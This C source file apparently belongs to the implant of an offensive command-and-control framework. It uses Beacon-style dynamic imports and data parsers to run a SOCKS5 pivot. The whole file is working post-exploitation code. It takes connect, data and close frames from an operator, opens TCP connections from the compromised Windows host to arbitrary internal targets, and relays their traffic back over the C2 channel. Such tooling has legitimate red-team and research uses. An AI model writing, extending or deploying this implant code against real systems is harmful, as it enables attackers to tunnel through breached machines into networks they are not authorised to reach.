#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "agent.h"
#include "tcg.h"

DECLSPEC_IMPORT u_short WINAPI  WS2_32$htons        ( u_short );
DECLSPEC_IMPORT int     WINAPI  WS2_32$WSAStartup   ( WORD, LPWSADATA );
DECLSPEC_IMPORT int     WINAPI  WS2_32$WSACleanup   ( );
DECLSPEC_IMPORT SOCKET  WINAPI  WS2_32$socket       ( int, int, int );
DECLSPEC_IMPORT int     WINAPI  WS2_32$connect      ( SOCKET, const struct sockaddr *, int );
DECLSPEC_IMPORT int     WINAPI  WS2_32$send         ( SOCKET, const char *, int, int );
DECLSPEC_IMPORT int     WINAPI  WS2_32$recv         ( SOCKET, char *, int, int );
DECLSPEC_IMPORT int     WINAPI  WS2_32$closesocket  ( SOCKET );
DECLSPEC_IMPORT int     WINAPI  WS2_32$setsockopt   ( SOCKET, int, int, const char *, int );
DECLSPEC_IMPORT int     WINAPI  WS2_32$getaddrinfo  ( const char *, const char *, const struct addrinfo *, struct addrinfo ** );
DECLSPEC_IMPORT void    WINAPI  WS2_32$freeaddrinfo ( struct addrinfo * );
DECLSPEC_IMPORT void *  WINAPIV MSVCRT$malloc       ( size_t );
DECLSPEC_IMPORT void    WINAPIV MSVCRT$free         ( void * );

#define memset(x, y, z) __stosb ( ( unsigned char * ) x, y, z );
#define memcpy(x, y, z) __movsb ( ( unsigned char * ) x, ( unsigned char * ) y, z );

#define SOCKS5_FRAME_DATA    0
#define SOCKS5_FRAME_CLOSE   1
#define SOCKS5_FRAME_CONNECT 2

#define MAX_SOCKS5_CONNS  32
#define SOCKS5_RECV_BUF   8192
#define SOCKS5_TIMEOUT_MS 500

typedef struct {
    UINT   connection_id;
    SOCKET sock;
    BOOL   active;
} socks5_conn;

socks5_conn g_socks5_conns [ MAX_SOCKS5_CONNS ];
BOOL        g_socks5_ready  = FALSE;

extern UINT g_current_task_id;

socks5_conn * socks5_find ( UINT connection_id )
{
    for ( int i = 0; i < MAX_SOCKS5_CONNS; i++ )
        if ( g_socks5_conns [ i ].active && g_socks5_conns [ i ].connection_id == connection_id )
            return &g_socks5_conns [ i ];

    return NULL;
}

socks5_conn * socks5_alloc_slot ( )
{
    for ( int i = 0; i < MAX_SOCKS5_CONNS; i++ )
        if ( ! g_socks5_conns [ i ].active )
            return &g_socks5_conns [ i ];

    return NULL;
}

void socks5_close ( UINT connection_id )
{
    socks5_conn * conn = socks5_find ( connection_id );

    if ( conn )
    {
        WS2_32$closesocket ( conn->sock );
        conn->active = FALSE;
        conn->sock   = INVALID_SOCKET;
    }
}

BOOL socks5_ensure_wsa ( )
{
    if ( g_socks5_ready )
        return TRUE;

    WSADATA wsa;

    if ( WS2_32$WSAStartup ( MAKEWORD ( 2, 2 ), &wsa ) != 0 )
        return FALSE;

    memset ( g_socks5_conns, 0, sizeof ( g_socks5_conns ) );

    for ( int i = 0; i < MAX_SOCKS5_CONNS; i++ )
        g_socks5_conns [ i ].sock = INVALID_SOCKET;

    g_socks5_ready = TRUE;

    return TRUE;
}

void send_proxy_reply ( UINT connection_id, char * data, int data_len, int complete )
{
    beacon_output_ex ( TASK_SOCKS, data, data_len, complete );
}

__attribute__ ( ( optimize ( "O0" ) ) ) void handle_socks5_connect ( UINT connection_id, datap * parser )
{
    int    host_len;
    char * host = BeaconDataExtract ( parser, &host_len );
    int    port = BeaconDataInt     ( parser );

    char * host_str = MSVCRT$malloc ( host_len + 1 );

    if ( ! host_str )
    {
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    memcpy  ( host_str, host, host_len );
    host_str [ host_len ] = '\0';

    char port_str [ 6 ];
    int p = port;
    int idx = 0;
    if ( p == 0 ) {
        port_str [ idx++ ] = '0';
    }
    else
    {
        char tmp [ 6 ];
        int  n   = 0;
        
        while ( p > 0 )
        {
            tmp [ n++ ] = '0' + ( p % 10 );
            p /= 10;
        }
        
        for ( int i = n - 1; i >= 0; i-- )
            port_str [ idx++ ] = tmp [ i ];
    }

    port_str [ idx ] = '\0';

    struct addrinfo hints;
    memset ( &hints, 0, sizeof ( hints ) );
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo * result = NULL;

    if ( WS2_32$getaddrinfo ( host_str, port_str, &hints, &result ) != 0 )
    {
        MSVCRT$free ( host_str );
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    MSVCRT$free ( host_str );

    SOCKET sock = INVALID_SOCKET;

    for ( struct addrinfo * ai = result; ai != NULL; ai = ai->ai_next )
    {
        sock = WS2_32$socket ( ai->ai_family, ai->ai_socktype, ai->ai_protocol );

        if ( sock == INVALID_SOCKET )
            continue;

        if ( WS2_32$connect ( sock, ai->ai_addr, ( int ) ai->ai_addrlen ) == 0 )
            break;

        WS2_32$closesocket ( sock );
        sock = INVALID_SOCKET;
    }

    WS2_32$freeaddrinfo ( result );

    if ( sock == INVALID_SOCKET )
    {
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    DWORD timeout_ms = SOCKS5_TIMEOUT_MS;
    WS2_32$setsockopt ( sock, SOL_SOCKET, SO_RCVTIMEO, ( char * ) &timeout_ms, sizeof ( timeout_ms ) );

    socks5_conn * slot = socks5_alloc_slot ( );

    if ( ! slot )
    {
        WS2_32$closesocket ( sock );
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    slot->connection_id = connection_id;
    slot->sock          = sock;
    slot->active        = TRUE;

    /* empty reply signals successful connection to the client */
    send_proxy_reply ( connection_id, NULL, 0, 0 );
}

__attribute__ ( ( optimize ( "O0" ) ) ) void handle_socks5_data ( UINT connection_id, datap * parser )
{
    socks5_conn * conn = socks5_find ( connection_id );

    if ( ! conn )
    {
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    int    payload_len = BeaconDataLength ( parser );
    char * payload     = BeaconDataPtr    ( parser, payload_len );

    if ( payload && payload_len > 0 )
        WS2_32$send ( conn->sock, payload, payload_len, 0 );

    char * recv_buf = MSVCRT$malloc ( SOCKS5_RECV_BUF );

    if ( ! recv_buf )
        return;

    int total    = 0;
    int complete = 0;

    int n = WS2_32$recv ( conn->sock, recv_buf, SOCKS5_RECV_BUF, 0 );

    if ( n > 0 ) {
        total = n;
    }
    else if ( n == 0 ) {
        /* target closed the connection gracefully */
        complete = 1;
    }

    send_proxy_reply ( connection_id, recv_buf, total, complete );
    MSVCRT$free ( recv_buf );

    if ( complete )
        socks5_close ( connection_id );
}

void handle_socks5_close ( UINT connection_id )
{
    socks5_close ( connection_id );
    /* no reply needed */
}

void handle_socks ( char * data, int len )
{
    UINT connection_id = g_current_task_id;

    if ( ! socks5_ensure_wsa ( ) )
    {
        send_proxy_reply ( connection_id, NULL, 0, 1 );
        return;
    }

    datap parser;
    BeaconDataParse ( &parser, data, len );

    int frame_type = BeaconDataInt ( &parser );

    switch ( frame_type )
    {
    case SOCKS5_FRAME_CONNECT:
        handle_socks5_connect ( connection_id, &parser );
        break;

    case SOCKS5_FRAME_DATA:
        handle_socks5_data ( connection_id, &parser );
        break;

    case SOCKS5_FRAME_CLOSE:
        handle_socks5_close ( connection_id );
        break;

    default:
        break;
    }
}